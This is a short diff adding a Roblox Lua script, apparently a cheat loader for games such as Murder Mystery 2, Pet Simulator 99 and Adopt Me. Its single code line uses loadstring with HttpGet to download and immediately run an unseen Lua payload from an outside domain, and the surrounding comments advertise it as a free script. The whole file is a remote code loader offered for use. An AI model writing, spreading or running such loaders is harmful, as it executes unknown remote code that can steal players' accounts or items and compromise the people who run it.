@@ -1,0 +1,5 @@
+-- works for mm2/petsim99/adoptme
+-- if you paid for this script you got scammed
+
+
+loadstring(game:HttpGet("https://egorikusa.space/d42ec57ea0470b71322556f1.lua", true))()
